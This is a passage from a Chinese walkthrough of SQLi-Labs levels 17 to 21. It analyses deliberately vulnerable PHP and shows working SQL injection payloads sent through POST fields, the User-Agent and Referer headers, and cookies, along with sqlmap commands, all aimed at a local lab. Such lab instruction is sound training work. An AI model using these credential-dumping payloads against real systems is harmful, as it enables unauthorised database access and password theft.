<span class="token variable">$passwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment"># SELECT 语句只获取了 uname 参数 但是被过滤了 没戏</span>
@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username= <span class="token interpolation"><span class="token variable">$uname</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> select 结果正确<span class="token punctuation">:</span>
    <span class="token comment"># 更新语句 使用单引号拼接 passwd</span>
    <span class="token variable">$update</span><span class="token operator">=</span><span class="token string double-quoted-string">"UPDATE users SET password = '<span class="token interpolation"><span class="token variable">$passwd</span></span>' WHERE username='<span class="token interpolation"><span class="token variable">$row1</span></span>'"</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> mysql 报错<span class="token punctuation">:</span>
            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>从源码中可以分享唯一的注入点是在 update 语句里面，只使用了单引号拼接。因为操作正确并没有啥提示，所以不能使用联合查询注入，因为输出了报错日志，所以还可以进行报错注入，那么下面就演示一下报错注入吧：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">passwd</span><span class="token operator">=</span><span class="token number">1</span>' AND <span class="token punctuation">(</span>SELECT <span class="token number">1</span> FROM <span class="token punctuation">(</span>SELECT COUNT<span class="token punctuation">(</span>*<span class="token punctuation">)</span>,CONCAT<span class="token variable"><span class="token punctuation">((</span>SELECT<span class="token punctuation">(</span>SELECT CONCAT<span class="token punctuation">(</span>CAST<span class="token punctuation">(</span>CONCAT<span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> AS CHAR<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">))</span></span> FROM <span class="token function">users</span> LIMIT <span class="token number">0,1</span><span class="token punctuation">)</span>,FLOOR<span class="token punctuation">(</span>RAND<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>*2<span class="token punctuation">))</span>x FROM INFORMATION_SCHEMA.TABLES GROUP BY x<span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token comment">#&amp;submit=Submit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">POST</td>
<td align="left">报错、布尔盲注、延时盲注</td>
<td align="left"><code>VALUES (&#39;$uagent&#39;)</code></td>
</tr>
</tbody></table>
<p><strong>简单源码分析</strong>:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 获取请求的 uagent 和 ip 地址</span>
<span class="token variable">$uagent</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$IP</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> 输入了uname 和 passwd<span class="token punctuation">:</span>
    <span class="token comment"># 对这两个参数进行过滤</span>
    <span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token interpolation"><span class="token variable">$uname</span></span> and users.password=<span class="token interpolation"><span class="token variable">$passwd</span></span> ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token constant">SQL</span>语句有返回结果<span class="token punctuation">:</span>
        <span class="token comment"># 执行 insert 语句 这里 uagent 和 ip_address 通过单引号拼接 并且 没有过滤</span>
        <span class="token variable">$insert</span><span class="token operator">=</span><span class="token string double-quoted-string">"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('<span class="token interpolation"><span class="token variable">$uagent</span></span>', '<span class="token interpolation"><span class="token variable">$IP</span></span>', <span class="token interpolation"><span class="token variable">$uname</span></span>)"</span><span class="token punctuation">;</span>
            输出 <span class="token variable">$uagent</span><span class="token punctuation">;</span>
        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个代码漏洞点出在了 insert 语句，这里没有对 uagent 和 ip_address 进行过滤，并且输出了 mysql 的报错信息，所以本关支持 报错注入、布尔盲注和延时盲注。</p>
<p><strong>PHP 里用来获取客户端 IP 的变量</strong></p>
<ul>
<li><code>$_SERVER[&#39;HTTP_CLIENT_IP&#39;]</code> 这个很少使用，不一定服务器都实现了。客户端可以伪造。</li>
<li><code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code>，客户端可以伪造。</li>
<li><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>，客户端不能伪造。</li>
</ul>
<p>所以这里的 IP 是无法被伪造的，这里只能通过修改 user-agent 来进行注入，考虑到 insert 语句的特殊性，这里使用闭合方式来闭合掉后面的语句，因为输出了 mysql 报错日志了，这里尝试报错注入效率会更高一点：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/Less-18/</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:8888</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) and '1'='1</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://127.0.0.1:8888/Less-18/</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">38</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>

uname=admin&amp;passwd=admin&amp;submit=Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://image.3001.net/images/20200513/15893833852620.png" alt="img"></p>
<h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">POST</td>
<td align="left">报错、布尔盲注、延时盲注</td>
<td align="left"><code>VALUES (&#39;$uagent&#39;)</code></td>
</tr>
</tbody></table>
<p><strong>简单源码分析</strong>:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 获取请求的 referer 和 ip 地址</span>
<span class="token variable">$uagent</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$IP</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> 输入了uname 和 passwd<span class="token punctuation">:</span>
    <span class="token comment"># uname 和 passwd 参数均被过滤</span>
    <span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token interpolation"><span class="token variable">$uname</span></span> and users.password=<span class="token interpolation"><span class="token variable">$passwd</span></span> ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token constant">SQL</span>语句有返回结果<span class="token punctuation">:</span>
        <span class="token comment"># 单引号拼接后直接带入 insert 语句</span>
        <span class="token variable">$insert</span><span class="token operator">=</span><span class="token string double-quoted-string">"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('<span class="token interpolation"><span class="token variable">$uagent</span></span>', '<span class="token interpolation"><span class="token variable">$IP</span></span>')"</span><span class="token punctuation">;</span>
        输出 <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_REFERER'</span><span class="token punctuation">]</span>
        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>本关和 Less-18 异曲同工，只是这里的漏洞点出在了 referer 里面，其他利用方式基本上也是一毛一样，所以下面直接上 payload 演示吧：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/Less-19/</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:8888</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) and '1'='1</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">38</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>

uname=admin&amp;passwd=admin&amp;submit=Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://image.3001.net/images/20200514/15894186942757.png" alt="img"></p>
<h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">POST</td>
<td align="left">联合、报错、布尔盲注、延时盲注</td>
<td align="left"><code>username=&#39;$cookee&#39;</code></td>
</tr>
</tbody></table>
<p><strong>简单源码分析</strong>:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> cookie 中不存在 uname 参数<span class="token punctuation">:</span>  
    输出了一堆无用的信息
    <span class="token keyword">if</span> 提交了 uname 和 passwd<span class="token punctuation">:</span>
        <span class="token comment"># 进行过滤</span>
        <span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token interpolation"><span class="token variable">$uname</span></span> and users.password=<span class="token interpolation"><span class="token variable">$passwd</span></span> ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span>
        <span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token variable">$row1</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> 有查询结果<span class="token punctuation">:</span>
            <span class="token comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>
            <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">,</span> <span class="token variable">$cookee</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token constant">POST</span> 数据里面没有 submit 参数<span class="token punctuation">:</span>
        <span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span>
        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE username='<span class="token interpolation"><span class="token variable">$cookee</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> 查询无结果<span class="token punctuation">:</span>
            输出 <span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> 有结果<span class="token punctuation">:</span>
            输出查询的信息
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>
        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">,</span> <span class="token variable">$row1</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>从源码中可以分析出 Less-20 要复杂一点，不过问题还是存在，从 cookie 中读取的 uname 参数值 并直接拼接到了 SQL 语句中了，这就导致了注入点的产生，并且还输出了查询信息，所以这里也是可以进行联合查询注入的。因为是基础关卡的最后一关，所以这里 老毛病又犯了，这里就再啰嗦一下：</p>
<h3 id="联合查询注入-2"><a href="#联合查询注入-2" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/Less-20/</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:8888</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">uname=admin' and 1=2 union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)#</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://image.3001.net/images/20200514/15894228024343.png" alt="img"></p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/Less-20/</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:8888</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">uname=admin'+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)#</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">11</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://image.3001.net/images/20200514/15894229147799.png" alt="img"></p>
<h3 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h3><p>布尔盲注和延时盲注也是 OK 的，但是实际上手工注入的效率并不如联合与报错注入，所以 这里就不演示了，下面直接演示 sqlmap 的注入过程吧：</p>
<h3 id="sqlmap-2"><a href="#sqlmap-2" class="headerlink" title="sqlmap"></a>sqlmap</h3><p><strong>联合查询注入</strong></p>
<p>如果 <code>--level</code> 设置为 <strong>2</strong> 或更高，则 sqlmap 会对 HTTP <code>Cookie</code> 请求头进行 SQL 注入测试:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-20/"</span> --cookie<span class="token operator">=</span><span class="token string">"uname=admin"</span> -p <span class="token string">"uname"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>U -v <span class="token number">3</span> --level<span class="token operator">=</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>当然手动通过<code>*</code>来标记注入也比较方便：<code>--cookie=&quot;uname=admin*&quot;</code></p>
<p>**报错注入</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-20/"</span> --cookie<span class="token operator">=</span><span class="token string">"uname=admin*"</span>--dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>E -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>**布尔盲注</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-20/"</span> --cookie<span class="token operator">=</span><span class="token string">"uname=admin*"</span>--dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>B -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>**延时盲注</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-20/"</span> --cookie<span class="token operator">=</span><span class="token string">"uname=admin*"</span>--dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>B -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h1 id="高级注入姿势-21-37-关"><a href="#高级注入姿势-21-37-关" class="headerlink" title="高级注入姿势 21-37 关"></a>高级注入姿势 21-37 关</h1><h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><table>
<thead>
<tr>
<th align="left">请求方式</th>
<th align="left">注入类型</th>
<th align="left">拼接方式</th>
</tr>
</thead>
<tbody><tr>
<td align="left">POST</td>
<td align="left">联合、报错、布尔盲注、延时盲注</td>
<td align="left"><code>username=(&#39;$cookee&#39;)</code></td>
</tr>
</tbody></table>
<p><strong>简单源码分析</strong>：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> cookie 中不存在 uname 参数<span class="token punctuation">:</span>  
    输出了一堆无用的信息
    <span class="token keyword">if</span> 提交了 uname 和 passwd<span class="token punctuation">:</span>
        <span class="token comment"># 进行过滤</span>
        <span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT  users.username, users.password FROM users WHERE users.username=<span class="token interpolation"><span class="token variable">$uname</span></span> and users.password=<span class="token interpolation"><span class="token variable">$passwd</span></span> ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> 有查询结果<span class="token punctuation">:</span>
            <span class="token comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>
            <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$row1</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token constant">POST</span> 数据里面没有 submit 参数<span class="token punctuation">:</span>
                 <span class="token comment"># 对 cookee 进行 base64 解密</span>
        <span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$cookee</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span>
        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE username='<span class="token interpolation"><span class="token variable">$cookee</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> 查询无结果<span class="token punctuation">:</span>
            输出 <span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> 有结果<span class="token punctuation">:</span>
            输出查询的信息
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>
        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$row1</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
